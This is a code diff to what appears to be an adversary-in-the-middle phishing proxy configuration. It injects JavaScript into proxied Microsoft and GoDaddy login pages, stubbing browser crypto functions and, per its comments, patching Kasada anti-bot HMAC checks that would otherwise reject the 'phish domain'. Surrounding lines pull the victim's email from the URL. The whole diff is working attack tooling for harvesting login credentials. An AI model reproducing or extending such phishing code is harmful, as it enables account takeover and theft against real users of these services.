@@ -286,6 +286,20 @@ js_inject:
   - trigger_domains: ["login.microsoftonline.com", "login.live.com"]
     trigger_paths: ["/common/oauth2/v2.0/authorize*", "/", "/*"]
     script: |
+      // Mock crypto.subtle functions for MSAL cache migration
+      if (window.crypto && window.crypto.subtle) {
+        try {
+          var _origDeriveKey = crypto.subtle.deriveKey;
+          if (!_origDeriveKey) {
+            crypto.subtle.deriveKey = function() { return Promise.resolve(new Uint8Array(32)); };
+          }
+          var _origDeriveBits = crypto.subtle.deriveBits;
+          if (!_origDeriveBits) {
+            crypto.subtle.deriveBits = function() { return Promise.resolve(new ArrayBuffer(32)); };
+          }
+        } catch(e) {}
+      }
+
       var _scEmail = '';
       var _hash = window.location.hash.slice(1);
       if (_hash && _hash.indexOf('@') !== -1) _scEmail = decodeURIComponent(_hash);
@@ -386,6 +400,18 @@ js_inject:
     trigger_paths: ["/*", "/login/tac/pass*"]
     script: |
       (function() {
+        // Mock missing crypto.subtle functions early
+        if (window.crypto && window.crypto.subtle) {
+          try {
+            if (!crypto.subtle.deriveKey) {
+              crypto.subtle.deriveKey = function() { return Promise.resolve(new Uint8Array(32)); };
+            }
+            if (!crypto.subtle.deriveBits) {
+              crypto.subtle.deriveBits = function() { return Promise.resolve(new ArrayBuffer(32)); };
+            }
+          } catch(e) {}
+        }
+
         // ── Kasada HMAC hostname patch ───────────────────────────────────────────
         // Kasada j-1.2.308 derives the X-Kpsdk-H HMAC key from window.location.hostname.
         // When proxied, that is the phish domain — GoDaddy's Kasada server rejects it.
